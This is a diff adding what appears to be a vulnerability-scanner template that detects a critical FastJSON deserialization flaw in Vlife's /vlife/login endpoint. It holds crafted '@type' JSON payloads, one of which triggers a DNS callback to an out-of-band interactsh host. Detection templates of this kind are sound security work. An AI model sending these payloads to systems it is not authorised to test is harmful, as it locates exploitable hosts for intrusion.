@@ -1,0 +1,37 @@
+id: vlife-fastjson-rce
+brief:
+    title: Vlife FastJSON - Remote Code Execution
+    by: omarkurt
+    level: critical
+    about: alibaba/fastjson v1.2.67 within the MyUsernamePasswordAuthenticationFilter for processing authentication requests. The /vlife/login endpoint directly deserializes the raw HTTP request body using JS...
+    label:
+        - vlife
+        - fastjson
+        - rce
+        - vuln
+    score: CVSS:9.8
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/vlife/login'
+      head:
+        Content-Type: application/json
+      body: '{"@type":"java.lang.Runtime"}'
+      signs: []
+    - verb: POST
+      to:
+        - '{{BaseURL}}/vlife/login'
+      head:
+        Content-Type: application/json
+      body: '{"@type":"java.net.Inet4Address","val":"{{interactsh-url}}"}'
+      signs:
+        - "on": word
+          has:
+            - dns
+          in: interactsh_protocol
+          need: all
+        - "on": word
+          has:
+            - com.alibaba.fastjson.JSONException
+          in: body
+          need: all
